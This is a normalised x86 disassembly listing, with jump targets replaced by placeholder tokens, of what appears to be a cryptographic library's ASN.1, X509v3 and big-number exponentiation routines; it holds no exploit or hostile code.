cmp edi ebx
jne r-xdata
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
push edi
call sub_1002edc0
add esp 0x4
mov [ ebp + 0x4 ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push ebx
xor ebp ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
cmp [ esp + 0x48 ] esi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1e0
retn
push eax
call sub_1001d740
add esp 0x4
mov ecx [ esp + 0x30 ]
mov [ ebp ] edi
mov [ eax + 0x8 ] ecx
mov edx [ ebp + 0x4 ]
mov eax [ esp + 0x38 ]
mov [ edx ] eax
jmp r-xdata
test esi esi
je r-xdata
push sub_1002f080
push eax
call sub_1001e730
add esp 0x8
mov edx [ esp + 0x1f8 ]
push edx
push ebp
push ebx
call sub_1001e7c0
mov eax [ eax + 0x8 ]
add esp 0x8
push eax
call sub_1005d820
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea edx [ esp + 0x1c ]
push edx
push edi
call sub_1002f050
mov ebp eax
push edi
mov [ esp + 0x20 ] ebp
call sub_1002f080
mov eax [ esp + 0x28 ]
add esp 0xc
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x48 ]
xor edi edi
cmp eax esi
je r-xdata
cmp [ esp + 0x1ec ] ebx
je r-xdata
test ebx ebx
je r-xdata
push esi
call sub_1002f080
add esp 0x4
mov ecx [ esp + 0x18 ]
push esi
push ecx
call sub_1001e6c0
xor esi esi
push ebx
inc ebp
call sub_1001e7b0
add esp 0xc
cmp ebp eax
jl r-xdata
mov eax [ esp + 0x1ec ]
xor edi edi
test eax eax
lea edx [ eax + eax * 4 ]
lea esi [ esp + edx * 4 + 0x48 ]
jle r-xdata
lea ecx [ esp + 0x40 ]
push ebp
lea edx [ esp + 0x48 ]
push ecx
lea eax [ esp + 0x30 ]
push edx
lea ecx [ esp + 0x30 ]
push eax
push ecx
call sub_1002e880
add esp 0x14
test al 0x80
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1e0
retn
mov edi [ esp + 0x14 ]
or esi 0xffffffff
xor ebx ebx
mov ecx [ esp + 0x1f8 ]
push ebx
push ecx
call sub_1005e6a0
add esp 0x8
push 0xe5
push r--data
push ebp
call sub_1001d4c0
mov ebx eax
mov eax [ esp + 0x1f8 ]
add esp 0xc
xor edi edi
test eax eax
mov [ esp + 0x2c ] ebx
mov [ esp + 0x10 ] ebx
jle r-xdata
mov edx [ esi + 0xc ]
mov eax [ esi ]
add ebp edx
push eax
push ebp
push 0x0
mov [ esi + 0x10 ] ebp
call sub_1002eb00
add esp 0xc
mov ebp eax
mov eax [ esp + 0x1ec ]
inc edi
sub esi 0x14
cmp edi eax
jl r-xdata
mov eax [ esp + 0x1c ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x1c ]
mov edi [ esp + 0x24 ]
sub edx edi
add ebp edx
test al 0x1
mov [ esp + 0x14 ] ebp
je r-xdata
mov eax [ esp + 0x48 ]
cmp eax 0xffffffff
je r-xdata
lea esi [ esp + 0x6c ]
mov eax [ esp + 0x2c ]
cmp eax ebx
je r-xdata
push eax
call sub_1001d740
add esp 0x4
and eax 0x20
mov [ esp + 0x20 ] eax
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x28 ] ebx
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x34 ]
and ecx 0x3
push ebp
push eax
push 0x0
[ edi ] [ esi ]
mov [ esp + 0x40 ] ebx
call sub_1002f030
add esp 0xc
mov edi eax
xor ebx ebx
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x28 ]
push ecx
push eax
mov eax [ esp + 0x28 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
call sub_1002ea00
add esp 0x14
mov eax [ esp + 0x1ec ]
inc edi
add esi 0x14
cmp edi eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x0
mov eax [ esp + 0x10 ]
inc eax
mov [ esp + 0x10 ] eax
push eax
call sub_1001d740
add esp 0x4
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x28 ]
push eax
push ecx
push ebx
call sub_1002eb00
add esp 0xc
mov ebp eax
mov ecx [ esi - 0xc ]
mov edx [ esi - 0x10 ]
mov eax [ esi ]
push ecx
mov ecx [ esi - 0x8 ]
push edx
push eax
lea edx [ esp + 0x1c ]
push ecx
push edx
call sub_1002ea00
mov eax [ esi - 0x4 ]
add esp 0x14
test eax eax
je r-xdata
sub_1005dc30
mov eax 0x8
call sub_1001d0d0
mov edx [ esp + 0xc ]
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
xor esi esi
xor ebp ebp
xor ecx ecx
cmp ebx esi
push edi
mov [ esp + 0x10 ] esi
mov eax edx
jle r-xdata
cmp ebx 0xffffffff
mov edi ebx
jne r-xdata
cmp [ eax ] 0x3a
je r-xdata
mov eax rw-data
mov [ rw-data ] eax
mov edi edx
or ecx ebx
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
lea ebp [ eax + 0x1 ]
mov ecx edx
sub ecx ebp
add ecx ebx
sub eax edx
mov [ esp + 0x10 ] ecx
mov ebx eax
inc eax
inc ecx
cmp ecx ebx
jl r-xdata
inc esi
add eax 0xc
cmp esi 0x2f
mov [ rw-data ] eax
jb r-xdata
mov eax [ eax ]
push edi
push edx
push eax
call strncmp
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
cmp edi [ eax + 0x4 ]
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov eax [ ecx + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ rw-data ]
mov edx [ esp + 0x1c ]
push 0x127
push r--data
push 0xc2
push 0xb1
push 0xd
call sub_1001de60
mov edx [ esp + 0x30 ]
push edx
push r--data
push 0x2
call sub_1001e1a0
add esp 0x20
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
test eax 0x10000
jne r-xdata
add eax 0xfffeffff
cmp eax 0x7
ja r-xdata
mov ecx [ esp + 0x24 ]
test ebp ebp
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x10 ] ebp
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
jmp [ eax * 4 + jump_table_1005def0 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x1c ]
cmp [ eax + ebx ] 0x0
je r-xdata
mov eax [ esp + 0x24 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov edx [ esp + 0x10 ]
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push edx
push ebp
call sub_1005df10
add esp 0x10
test eax eax
je r-xdata
push 0x1
push 0x0
push 0x1
push 0x0
push 0x10
jmp r-xdata
mov ecx [ esp + 0x24 ]
push 0x1
push 0x0
push 0x1
push 0x0
push 0x11
push ecx
jmp r-xdata
mov edx [ esp + 0x24 ]
push 0x1
push 0x1
push 0x0
push 0x0
push 0x3
push edx
jmp r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
push 0x4
push 0x5
push r--data
push ebp
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push 0x134
push r--data
push 0xbd
jmp r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ eax + 0x4 ]
push ecx
push eax
push edx
push ebp
call sub_1005df10
add esp 0x10
jmp r-xdata
push 0x141
push r--data
push 0xb5
jmp r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x24 ]
push 0x0
push 0x0
push 0x1
push eax
push ecx
push edx
jmp r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_1005e090
add esp 0x18
push 0x4
push r--data
push ebp
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0x24 ]
mov [ ecx + 0xc ] 0x1
push 0xb1
push 0xd
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
test eax eax
jne r-xdata
push 0x3
push r--data
push ebp
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ edx + 0xc ] 0x2
mov eax 0x1
pop ebx
add esp 0x8
retn
push 0x3
push r--data
push ebp
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ eax + 0xc ] 0x3
mov eax 0x1
pop ebx
add esp 0x8
retn
push 0x16f
push r--data
push 0xc3
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ ecx + 0xc ] 0x4
mov eax 0x1
pop ebx
add esp 0x8
retn
sub_1005df10
mov eax 0x4
call sub_1001d0d0
push esi
mov esi [ esp + 0xc ]
test esi esi
push edi
jne r-xdata
lea eax [ esp + 0x8 ]
push 0xa
push eax
push esi
call strtoul
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x20 ]
add esp 0xc
test ecx ecx
je r-xdata
pop edi
xor eax eax
pop esi
pop ecx
retn
test eax eax
jge r-xdata
push ebx
mov bl [ ecx ]
test bl bl
pop ebx
je r-xdata
mov edi [ esp + 0x18 ]
test ecx ecx
mov [ edi ] eax
je r-xdata
push 0x187
push r--data
push 0xbb
push 0xb6
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ecx
retn
lea edi [ esi + edx ]
cmp ecx edi
jbe r-xdata
mov edx [ esp + 0x1c ]
pop edi
mov eax 0x1
pop esi
mov [ edx ] 0x80
pop ecx
retn
sub esi ecx
add edx esi
test edx edx
je r-xdata
pop edi
xor eax eax
pop esi
pop ecx
retn
mov cl [ ecx ]
movsx eax cl
add eax 0xffffffbf
cmp eax 0x14
ja r-xdata
push 0x1a8
push r--data
push 0xba
push 0xb6
push 0xd
mov [ esp + 0x24 ] cl
mov [ esp + 0x25 ] 0x0
call sub_1001de60
lea ecx [ esp + 0x24 ]
push ecx
push r--data
push 0x2
call sub_1001e1a0
add esp 0x20
xor eax eax
pop edi
pop esi
pop ecx
retn
xor edx edx
mov dl [ eax + lookup_table_1005e06c ]
jmp [ edx * 4 + jump_table_1005e058 ]
mov eax [ esp + 0x1c ]
pop edi
pop esi
mov [ eax ] 0x0
mov eax 0x1
pop ecx
retn
mov ecx [ esp + 0x1c ]
pop edi
mov eax 0x1
pop esi
mov [ ecx ] 0x40
pop ecx
retn
mov edx [ esp + 0x1c ]
pop edi
mov eax 0x1
pop esi
mov [ edx ] 0xc0
pop ecx
retn
mov eax [ esp + 0x1c ]
pop edi
pop esi
mov [ eax ] 0x80
mov eax 0x1
pop ecx
retn
sub_1005e090
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax ]
cmp esi 0xffffffff
je r-xdata
mov ecx [ eax + 0x1a4 ]
cmp ecx 0x14
jne r-xdata
mov ecx [ esp + 0x1c ]
test ecx ecx
jne r-xdata
inc ecx
cmp esi 0xffffffff
mov [ eax + 0x1a4 ] ecx
lea edx [ ecx + ecx * 4 ]
lea edx [ eax + edx * 4 ]
je r-xdata
push 0x209
push r--data
push 0xae
push 0x203
push r--data
push 0xb3
jmp r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ edx ] eax
mov [ edx + 0x4 ] ecx
mov [ edx ] esi
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov [ eax ] 0xffffffff
mov [ eax + 0x4 ] 0xffffffff
jmp r-xdata
push 0xb0
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov [ edx + 0x8 ] eax
mov [ edx + 0xc ] ecx
mov eax 0x1
pop esi
retn
sub_1005e130
mov eax 0x10
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
call sub_1002f070
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov edi [ esp + 0x24 ]
cmp edi ebx
jne r-xdata
push 0x27d
push r--data
push 0x41
push 0xb3
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ebp [ esp + 0x2c ]
lea eax [ ebp - 0x1 ]
cmp eax 0x1d
ja r-xdata
mov edi rw-data
push 0x328
push r--data
push 0xc4
xor ecx ecx
mov cl [ eax + lookup_table_1005e5a8 ]
jmp [ ecx * 4 + jump_table_1005e588 ]
cmp edi ebx
je r-xdata
cmp [ esp + 0x28 ] 0x1
je r-xdata
cmp [ esp + 0x28 ] 0x1
je r-xdata
cmp [ esp + 0x28 ] 0x1
je r-xdata
cmp [ esp + 0x28 ] 0x1
je r-xdata
mov eax [ esp + 0x28 ]
cmp eax 0x1
jne r-xdata
call sub_1002ed60
cmp eax ebx
mov [ esi + 0x4 ] eax
jne r-xdata
mov [ esi ] ebp
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
cmp [ edi ] bl
je r-xdata
lea edx [ esi + 0x4 ]
lea eax [ esp + 0x14 ]
push edx
push eax
mov [ esp + 0x20 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x24 ] edi
call sub_10056540
add esp 0x8
test eax eax
jne r-xdata
push 0x292
push r--data
push 0xbe
push 0xb3
push 0xd
call sub_1001de60
add esp 0x14
push esi
call sub_1002f080
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push edi
push ebx
call sub_100562e0
add esp 0x8
cmp eax ebx
mov [ esi + 0x4 ] eax
jne r-xdata
push 0x2a3
push r--data
push 0xb9
push 0xb3
push 0xd
call sub_1001de60
add esp 0x14
push esi
call sub_1002f080
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push ebx
push edi
call sub_10022b70
add esp 0x8
cmp eax ebx
mov [ esi + 0x4 ] eax
jne r-xdata
push 0x2b0
push r--data
push 0xbf
push 0xb3
push 0xd
call sub_1001de60
add esp 0x14
push esi
call sub_1002f080
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
call sub_1002ed60
cmp eax ebx
mov [ esi + 0x4 ] eax
jne r-xdata
push 0x2be
push r--data
push 0xc1
push 0xb3
push 0xd
call sub_1001de60
add esp 0x14
push esi
call sub_1002f080
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
cmp eax 0x2
jne r-xdata
mov ebx 0x1001
jmp r-xdata
mov ecx [ esp + 0x28 ]
cmp ecx 0x3
jne r-xdata
push 0x2f8
push r--data
push 0x41
push 0xb3
push 0xd
call sub_1001de60
add esp 0x14
push esi
call sub_1002f080
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push 0x28a
push r--data
push 0xb6
push 0xb3
push 0xd
call sub_1001de60
add esp 0x14
push esi
call sub_1002f080
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push 0x29a
push r--data
push 0xb0
jmp r-xdata
push 0x2a8
push r--data
push 0xb4
jmp r-xdata
push 0x2b5
push r--data
push 0xb7
jmp r-xdata
push 0xffffffff
push edi
push eax
call sub_1002ec90
add esp 0xc
test eax eax
jne r-xdata
push 0x2c3
push r--data
push 0x41
jmp r-xdata
push 0x2e3
push r--data
push 0xb1
push 0xb3
push 0xd
call sub_1001de60
add esp 0x14
push esi
call sub_1002f080
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ebx 0x1000
push ebp
call sub_10030ea0
push eax
push ebx
push 0xffffffff
lea eax [ esi + 0x4 ]
push edi
push eax
call sub_10067490
add esp 0x18
test eax eax
jg r-xdata
cmp ecx 0x1
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push edi
call sub_10056f30
add esp 0x8
cmp eax ebx
jne r-xdata
push 0xb3
push 0xd
call sub_1001de60
add esp 0x14
push edi
push r--data
push 0x2
call sub_1001e1a0
add esp 0xc
push esi
call sub_1002f080
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x4 ] ebp
mov edx [ esi + 0x4 ]
push edx
call sub_100483b0
add esp 0x4
test eax eax
jne r-xdata
push 0x2c8
push r--data
push 0x41
jmp r-xdata
push 0x2eb
push r--data
push 0x41
jmp r-xdata
cmp ecx 0x4
jne r-xdata
push 0xffffffff
push edi
push eax
call sub_1002ec90
add esp 0xc
jmp r-xdata
mov edx [ esi + 0x4 ]
mov [ edx + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ edx + 0x4 ] ebp
push 0x301
push r--data
push 0xb2
jmp r-xdata
push 0x2ce
push r--data
push 0xb8
jmp r-xdata
push 0x318
push r--data
push 0xaf
push 0xb3
push 0xd
call sub_1001de60
add esp 0x14
push esi
call sub_1002f080
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
cmp ebp 0x3
jne r-xdata
cmp ebp 0x3
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax + 0xc ]
and edx 0xfffffff0
mov [ eax + 0xc ] edx
mov eax [ esi + 0x4 ]
or [ eax + 0xc ] 0x8
push eax
push r-xdata
push 0x1
push 0x2c
push edi
call sub_10061130
add esp 0x14
test eax eax
jne r-xdata
push 0x310
push r--data
push 0xbc
jmp r-xdata
sub_1005e5b0
pop es
add [ edi ] eax
add eax 0x7070707
pop es
pop es
add eax 0x6050705
push es
pop es
add eax 0x5070505
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
lea eax [ esp + 0x8 ]
push 0xa
push eax
push esi
call strtoul
mov ecx [ esp + 0x14 ]
add esp 0xc
test ecx ecx
je r-xdata
test eax eax
jge r-xdata
cmp [ ecx ] 0x0
je r-xdata
push 0x1
push eax
mov eax [ esp + 0x18 ]
push eax
call sub_10050ae0
add esp 0xc
test eax eax
jne r-xdata
push 0x346
push r--data
push 0xbb
jmp r-xdata
mov edx [ esp + 0xc ]
add esi edx
cmp ecx esi
jne r-xdata
mov eax 0x1
pop esi
retn
push 0x34b
push r--data
push 0x41
push 0xb4
push 0xd
call sub_1001de60
add esp 0x14
sub_1005e650
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
push 0x190
push r--data
push 0x94
push 0x8e
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
retn
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov edx [ esp + 0x8 ]
push edx
push ecx
call eax
add esp 0x8
retn
sub_1005e6a0
mov edx [ esp + 0x8 ]
test edx edx
je r-xdata
retn
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x14 ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ ecx + 0x18 ]
push edx
push ecx
call eax
add esp 0x8
sub_1005e790
mov eax 0xa0
call sub_1001d0d0
push ebx
mov ebx [ esp + 0xac ]
push esi
push ebx
xor esi esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0xb4 ]
pop esi
pop ebx
add esp 0xa0
retn
push edi
push esi
push ebx
call sub_1001e7c0
mov edi eax
lea ecx [ esp + 0x64 ]
mov eax [ edi ]
push eax
push 0x50
push ecx
call sub_10030590
mov edx [ edi + 0x4 ]
lea eax [ esp + 0x20 ]
push edx
push 0x50
push eax
call sub_10030590
lea ecx [ esp + 0xd8 ]
lea edx [ esp + 0x2c ]
push ecx
lea eax [ esp + 0x80 ]
push edx
push eax
call sub_10055f50
push ebx
inc esi
call sub_1001e7b0
add esp 0x30
cmp esi eax
jl r-xdata
mov eax [ esp + 0xb8 ]
pop edi
pop esi
pop ebx
add esp 0xa0
retn
sub_1005e830
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
call sub_1001e3c0
test eax eax
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ esp + 0x20 ]
xor ebp ebp
push eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x7a
push r--data
push 0x41
push 0x91
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ecx [ esp + 0x20 ]
push ebp
push ecx
call sub_1001e7c0
mov esi eax
add esp 0x8
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push sub_1005e770
push ecx
call sub_1001e730
push 0x82
push r--data
push 0x6e
push 0x91
push 0x22
call sub_1001de60
mov edx [ esi + 0x8 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push edx
push r--data
push eax
push r--data
push ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push r--data
push 0x6
call sub_1001e1a0
add esp 0x38
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push 0x0
push eax
call sub_10022b70
mov edx [ esi + 0x8 ]
push 0x0
push edx
mov edi eax
call sub_10022b70
add esp 0x10
mov ebx eax
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
push sub_1005e770
push eax
call sub_1001e730
push 0x8a
push r--data
push 0x6e
push 0x91
push 0x22
call sub_1001de60
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
push ecx
push r--data
push edx
push r--data
push eax
test ebx ebx
je r-xdata
push r--data
call sub_10033120
add esp 0x4
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push sub_1005e770
push edx
call sub_1001e730
push 0x91
push r--data
push 0x41
push 0x91
push 0x22
call sub_1001de60
add esp 0x1c
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ eax ] edi
mov [ eax + 0x4 ] ebx
push eax
mov eax [ esp + 0x14 ]
push eax
call sub_1001e6c0
mov ecx [ esp + 0x28 ]
inc ebp
push ecx
call sub_1001e7b0
add esp 0xc
cmp ebp eax
jl r-xdata
sub_1005e9d0
mov eax 0x128
call sub_1001d0d0
mov eax [ esp + 0x140 ]
push esi
push edi
xor edi edi
mov ecx [ eax ]
mov [ esp + 0x24 ] edi
mov [ esp + 0x8 ] edi
test [ ecx ] 0x1
jne r-xdata
mov edx [ esp + 0x13c ]
push edx
call sub_10029870
mov esi eax
mov eax [ esp + 0x148 ]
push eax
call sub_10029870
add esp 0x8
cmp esi edi
mov [ esp + 0x18 ] eax
jne r-xdata
push 0x8a
push r--data
push 0x66
push 0x76
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
add esp 0x128
retn
cmp esi eax
mov [ esp + 0x10 ] esi
jg r-xdata
cmp eax edi
jne r-xdata
push ebx
push ebp
mov ebp [ esp + 0x154 ]
push ebp
call sub_1002dd20
push ebp
call sub_1002de70
mov edi eax
push ebp
mov [ esp + 0x20 ] edi
call sub_1002de70
mov ebx eax
push ebp
mov [ esp + 0x38 ] ebx
call sub_1002de70
push ebp
mov [ esp + 0xcc ] eax
call sub_1002de70
mov ecx [ esp + 0x16c ]
add esp 0x14
test edi edi
mov [ esp + 0x38 ] eax
je r-xdata
mov [ esp + 0x10 ] eax
mov ecx [ esp + 0x134 ]
push 0x1
push ecx
call sub_10029cf0
add esp 0x8
pop edi
pop esi
add esp 0x128
retn
mov eax [ esp + 0x158 ]
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
push ebp
call sub_1002de00
mov eax [ esp + 0x30 ]
add esp 0x4
pop ebp
pop ebx
pop edi
pop esi
add esp 0x128
retn
mov edi [ esp + 0x10 ]
mov edx [ esp + 0xb8 ]
test edx edx
je r-xdata
push edi
call sub_1004c390
add esp 0x4
test eax eax
je r-xdata
test ecx ecx
je r-xdata
call sub_1004c330
mov edi eax
test edi edi
mov [ esp + 0x10 ] edi
je r-xdata
mov edi ecx
mov [ esp + 0x10 ] edi
jmp r-xdata
mov edx [ esp + 0x150 ]
push ebp
push edx
push edi
call sub_1004c3d0
add esp 0xc
test eax eax
je r-xdata
cmp esi 0x29f
jle r-xdata
test edi edi
je r-xdata
cmp esi 0xef
jle r-xdata
mov ebx 0x6
jmp r-xdata
cmp esi 0x4f
jle r-xdata
mov ebx 0x5
jmp r-xdata
mov eax [ esp + 0x20 ]
mov [ esp + 0x24 ] ebx
cmp eax 0x29f
jle r-xdata
xor ebx ebx
cmp esi 0x17
setle bl
dec ebx
and ebx 0x2
inc ebx
mov ebx 0x4
jmp r-xdata
cmp eax 0xef
jle r-xdata
mov [ esp + 0x1c ] 0x6
jmp r-xdata
cmp eax 0x4f
jle r-xdata
mov [ esp + 0x1c ] 0x5
jmp r-xdata
mov esi [ esp + 0x140 ]
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
xor ecx ecx
cmp eax 0x17
setle cl
dec ecx
and ecx 0x2
inc ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x1c ] 0x4
jmp r-xdata
mov eax [ esp + 0x150 ]
push ebp
push eax
push esi
mov esi [ esp + 0xc4 ]
push esi
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x150 ]
push edx
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov eax esi
mov eax esi
mov esi [ esp + 0xb8 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
push ebp
push edi
push ecx
push eax
push esi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x13c ]
push 0x0
push ecx
call sub_10029cf0
add esp 0x8
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp + 0x2c ] 0x1
mov esi [ esp + 0x148 ]
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
push ebp
push edx
push esi
push esi
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x150 ]
mov edx [ esp + 0x38 ]
push ebp
push ecx
push esi
push edx
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x150 ]
push eax
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov ecx [ esp + 0x24 ]
mov edi 0x1
dec ecx
mov ebx 0x1
shl edi cl
cmp edi ebx
jle r-xdata
mov eax [ esp + 0x38 ]
mov eax esi
jmp r-xdata
lea esi [ esp + 0xbc ]
mov ecx [ esp + 0x10 ]
push ebp
push ecx
add ecx 0x4
push ecx
mov ecx [ esp + 0x44 ]
push eax
push ecx
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x13c ]
push 0x0
push eax
call sub_10029cf0
add esp 0x8
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
push ebp
push edx
mov edx [ esi - 0x4 ]
push ecx
push edx
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
cmp [ esp + 0x1c ] 0x1
jle r-xdata
inc ebx
add esi 0x4
cmp ebx edi
jl r-xdata
mov eax [ esp + 0x10 ]
push ebp
push eax
add eax 0x4
xor esi esi
push eax
mov [ esp + 0x2c ] 0x1
xor edi edi
mov [ esp + 0x3c ] esi
mov [ esp + 0x40 ] esi
call sub_10029810
push eax
mov eax [ esp + 0x38 ]
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x38 ]
push ebp
push edx
push eax
push eax
mov eax [ esp + 0x24 ]
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
push ebp
call sub_1002de70
add esp 0x4
mov [ esi ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
lea eax [ ecx - 0x1 ]
test eax eax
mov [ esp + 0x14 ] eax
jl r-xdata
mov ecx [ esp + 0x1c ]
mov edi 0x1
dec ecx
mov ebx 0x1
shl edi cl
cmp edi ebx
jle r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x13c ]
push ebp
push eax
push ecx
push edx
call sub_1004bfb0
add esp 0x10
dec eax
mov [ esp + 0x18 ] eax
lea esi [ esp + 0x3c ]
test edi edi
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x28 ]
push ebp
push edx
push eax
push eax
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
push ebp
push edx
mov edx [ esi - 0x4 ]
push ecx
push edx
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x144 ]
push eax
push ecx
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
inc ebx
add esi 0x4
cmp ebx edi
